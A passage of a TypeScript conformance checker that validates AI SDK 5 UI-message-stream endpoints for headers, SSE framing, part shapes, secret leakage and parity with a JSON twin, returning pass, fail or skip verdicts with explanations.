  return `{${Object.keys(o).sort().map((k) => `${JSON.stringify(k)}:${canonicalPartJson(o[k])}`).join(',')}}`
}

/**
 * Canonical JSON forms a stream `output` may legitimately equal to be at parity
 * with `twin`: the whole twin, OR a SINGLE-LEVEL unwrap of a common projection
 * envelope — `twin.data` / `twin.result`, or (when the twin wraps exactly one
 * object/array value) that sole value. This lets an enveloped twin
 * `{ ok: true, data: WIDGETS }` match a stream that emits the `WIDGETS` slice,
 * while a GENUINE divergence (different values/shape) still matches nothing.
 */
function parityAcceptedForms(twin: unknown): string[] {
  const forms = [canonicalPartJson(twin)]
  if (twin && typeof twin === 'object' && !Array.isArray(twin)) {
    const o = twin as Record<string, unknown>
    for (const key of ['data', 'result']) {
      if (o[key] !== undefined) forms.push(canonicalPartJson(o[key]))
    }
    const values = Object.values(o)
    if (values.length === 1 && values[0] !== null && typeof values[0] === 'object') {
      forms.push(canonicalPartJson(values[0]))
    }
  }
  return forms
}

/** (1) transport: the v1 stream header + a text/event-stream content-type. */
function judgeUiStreamTransport(us: UiStreamContext): { verdict: Verdict; detail: string } {
  if (!us.declared) return { verdict: 'skip', detail: NOT_READY_STREAM }
  if (!us.streamOk) return { verdict: 'fail', detail: `declares a UI-message-stream face but the endpoint returned no stream body (status ${us.status ?? 'fetch-failed'}) — nothing to consume as an SSE stream` }
  if (!us.statusOk) return { verdict: 'fail', detail: `the UI-message-stream endpoint returned HTTP ${us.status} — an AI SDK host checks \`response.ok\` and throws on a non-2xx status, so a non-2xx stream is not consumable regardless of its header/framing` }
  if (us.header !== 'v1') {
    return { verdict: 'fail', detail: `the \`x-vercel-ai-ui-message-stream\` response header is ${us.header ? `\`${us.header}\`` : 'absent'} — an AI SDK 5 UI message stream must send \`x-vercel-ai-ui-message-stream: v1\`` }
  }
  if (!isEventStream(us.contentType)) {
    return { verdict: 'fail', detail: `content-type is ${us.contentType ? `\`${us.contentType}\`` : 'absent'} — a UI message stream must be served as \`text/event-stream\`` }
  }
  return pass('served with `x-vercel-ai-ui-message-stream: v1` and a `text/event-stream` content-type')
}

/** (2) framing: data:{json} chunks, a bare [DONE] terminal, each payload typed JSON. */
function judgeUiStreamFraming(us: UiStreamContext): { verdict: Verdict; detail: string } {
  if (!us.declared) return { verdict: 'skip', detail: NOT_READY_STREAM }
  if (!us.streamOk) return { verdict: 'fail', detail: `declares a UI-message-stream face but returned no stream body (status ${us.status ?? 'fetch-failed'}) — no SSE frames to validate` }
  if (!us.statusOk) return { verdict: 'skip', detail: `stream returned a non-2xx status (${us.status}) — not consumable; see ui-stream-transport` }
  if (us.framingErrors.length > 0) return { verdict: 'fail', detail: us.framingErrors[0]! }
  if (us.parts.length === 0) return { verdict: 'fail', detail: 'the stream carries no typed data parts (only a [DONE] terminal or empty) — nothing an agent host could render' }
  return pass(`valid SSE framing — ${us.parts.length} typed \`data: {json}\` part(s) closed by a bare \`data: [DONE]\` terminal`)
}

/** (3) part shapes: every part spec-correct per AI SDK 5. */
function judgeUiStreamPartShapes(us: UiStreamContext): { verdict: Verdict; detail: string } {
  if (!us.declared) return { verdict: 'skip', detail: NOT_READY_STREAM }
  if (!us.streamOk) return { verdict: 'skip', detail: 'no stream body observed — see ui-stream-transport / ui-stream-framing' }
  if (!us.statusOk) return { verdict: 'skip', detail: 'stream returned a non-2xx status — see ui-stream-transport' }
  if (us.parts.length === 0) return { verdict: 'skip', detail: 'no typed parts to shape-check — see ui-stream-framing' }
  for (const p of us.parts) {
    const err = uiStreamPartShapeError(p)
    if (err) return { verdict: 'fail', detail: `${err} — the agent host cannot correctly render/consume the stream` }
  }
  return pass(`all ${us.parts.length} part(s) match an AI SDK 5 UI-message-stream shape`)
}

/** (4) envelope hygiene: no secret in any part (reuses the shared detector). */
function judgeUiStreamEnvelopeHygiene(us: UiStreamContext): { verdict: Verdict; detail: string } {
  if (!us.declared) return { verdict: 'skip', detail: NOT_READY_STREAM }
  if (!us.streamOk) return { verdict: 'skip', detail: 'no stream body observed — nothing to scan for secrets' }
  if (!us.statusOk) return { verdict: 'skip', detail: 'stream returned a non-2xx status — see ui-stream-transport' }
  if (us.parts.length === 0) return { verdict: 'skip', detail: 'no parts to scan for secrets — see ui-stream-framing' }
  for (const p of us.parts) {
    const hits = secretsIn(p)
    if (hits.length > 0) {
      return { verdict: 'fail', detail: `a secret (${hits[0]}) leaks into a \`${String(p.type)}\` UI-message-stream part — every stream part is model/agent-visible; credentials must never ride the stream` }
    }
  }
  return pass('no secret detected in any UI-message-stream part')
}

/** (5) projection-parity: tool-output-available `output` is consistent with the JSON twin. */
function judgeUiStreamParity(us: UiStreamContext): { verdict: Verdict; detail: string } {
  if (!us.declared) return { verdict: 'skip', detail: NOT_READY_STREAM }
  if (!us.streamOk) return { verdict: 'skip', detail: 'no stream body observed — nothing to diff against a twin' }
  if (!us.statusOk) return { verdict: 'skip', detail: 'stream returned a non-2xx status — see ui-stream-transport' }
  if (!us.twinPresent) {
    return { verdict: 'skip', detail: 'no JSON/MCP twin is observable for this target — projection-parity is not applicable (not fabricated as a pass)' }
  }
  const outputs = us.parts
    .filter((p) => p.type === 'tool-output-available' && fieldPresent(p, 'output'))
    .map((p) => p.output)
  if (outputs.length === 0) {
    return { verdict: 'skip', detail: 'a JSON twin is observable but the stream emits no tool-output-available part to diff against it' }
  }
  // Accept the whole twin OR a single-level unwrap of a common projection
  // envelope: a stream that emits the WIDGETS slice while the twin serves
  // `{ ok: true, data: WIDGETS }` is a projection wrapper, not a divergence.
  const accepted = new Set(parityAcceptedForms(us.twin))
  for (const out of outputs) {
    if (!accepted.has(canonicalPartJson(out))) {
      const conflicts = conflictingKeys(out, us.twin)
      const why = conflicts.length > 0 ? conflicts.slice(0, 4).join('; ') : 'the output and twin are not JSON-equal (differing keys/shape)'
      return { verdict: 'fail', detail: `a tool-output-available \`output\` diverges from the JSON twin — the stream must project the SAME data the json/MCP twin serves (register divergence): ${why}` }
    }
  }
  return pass('tool-output-available `output` is byte/JSON-consistent with the JSON twin (or a single-level projection-envelope unwrap of it)')
}

function looksLikeHtml(body: string): boolean {
  return /^\s*(<!doctype html|<html|<head|<body)/i.test(body) || /<html[\s>]/i.test(body.slice(0, 1024))
}

function pass(detail: string): { verdict: Verdict; detail: string } {
  return { verdict: 'pass', detail }
}

function fail(ev: Evidence | undefined, expected: string): { verdict: Verdict; detail: string } {
  const got = !ev ? 'not fetched' : ev.status === null ? `fetch failed (${ev.error ?? 'unknown'})` : `status ${ev.status}`
  return { verdict: 'fail', detail: `${expected} — got: ${got}` }
}

function check(
  id: string, title: string, axItem: number | undefined, evidence: string[],
  result: { verdict: Verdict; detail: string },
): CheckResult {
  const c: CheckResult = { id, title, verdict: result.verdict, detail: result.detail, evidence }
  if (axItem !== undefined) c.axItem = axItem
  return c
}
